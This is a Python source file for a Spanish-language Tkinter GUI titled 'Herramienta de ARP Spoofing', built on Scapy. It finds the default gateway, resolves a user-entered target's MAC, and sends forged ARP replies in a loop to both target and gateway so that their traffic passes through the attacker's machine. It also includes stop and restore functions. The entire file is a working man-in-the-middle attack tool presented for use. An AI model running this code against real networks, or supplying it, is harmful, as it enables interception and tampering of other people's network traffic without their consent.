import tkinter as tk
from tkinter import scrolledtext
from scapy.all import ARP, Ether, send, srp
import time
import threading
import uuid
import socket
import os

# Dirección IP de la puerta de enlace (se obtiene automáticamente)
ip_puerta_enlace = None

# Obtener la dirección MAC del atacante (máquina local)
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])

ataque_en_curso = False

# Función para obtener la dirección MAC de un dispositivo dada su IP
def obtener_mac(ip):
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Dirección MAC de broadcast
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=2, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc

def spoofing_arp(ip_objetivo, widget_salida):
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)  # Obtener la MAC del objetivo
    if not mac_objetivo:
        widget_salida.insert(tk.END, f"No se pudo obtener la dirección MAC del objetivo {ip_objetivo}.\n")
        return

    widget_salida.insert(tk.END, f"Dirección MAC del objetivo {ip_objetivo}: {mac_objetivo}\n")
    
    try:
        # Paquete ARP de respuesta hacia el objetivo
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)

        # Paquete ARP de respuesta hacia la puerta de enlace (con MAC de broadcast)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

        while ataque_en_curso:
            # Enviar los paquetes ARP en ambas direcciones
            send(respuesta_arp_objetivo, verbose=0)
            send(respuesta_arp_puerta, verbose=0)
            
            widget_salida.insert(tk.END, f"Enviando ARP spoofing a {ip_objetivo}...\n")
            widget_salida.see(tk.END)
            time.sleep(2)
    
    except Exception as e:
        widget_salida.insert(tk.END, f"Ocurrió un error: {e}\n")
        restaurar_conexion(ip_objetivo)

# Función para restaurar la conexión en caso de error
def restaurar_conexion(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)

    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)

        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)
        print("Conexión restaurada.")
    else:
        print("No se pudo restaurar la conexión: no se pudieron obtener direcciones MAC.")

# Función para iniciar el ataque ARP spoofing
def iniciar_spoofing():
    global ataque_en_curso
    ip_objetivo = entrada_ip.get()
    if ip_objetivo:
        widget_salida.delete(1.0, tk.END)
        ataque_en_curso = True  
        hilo = threading.Thread(target=spoofing_arp, args=(ip_objetivo, widget_salida), daemon=True)
        hilo.start()

# Función para detener el ataque
def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False  
    widget_salida.insert(tk.END, "Ataque cancelado.\n")
    widget_salida.see(tk.END)  

# Función para obtener la puerta de enlace automáticamente
def obtener_puerta_enlace():
    # Obtener la IP de la puerta de enlace por defecto en la máquina
    gateway = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
    return gateway

# Ventana de la interfaz gráfica
ventana = tk.Tk()
ventana.title("Herramienta de ARP Spoofing")

# Elementos de la interfaz gráfica
tk.Label(ventana, text="Ingrese la IP objetivo:").pack(pady=5)
entrada_ip = tk.Entry(ventana, width=30)
entrada_ip.pack(pady=5)

boton_iniciar = tk.Button(ventana, text="Iniciar ARP Spoofing", command=iniciar_spoofing)
boton_iniciar.pack(pady=10)

boton_detener = tk.Button(ventana, text="Cancelar ARP Spoofing", command=detener_spoofing)
boton_detener.pack(pady=10)

widget_salida = scrolledtext.ScrolledText(ventana, width=50, height=15)
widget_salida.pack(pady=5)

# Inicializamos la puerta de enlace automáticamente
ip_puerta_enlace = obtener_puerta_enlace()

ventana.mainloop()
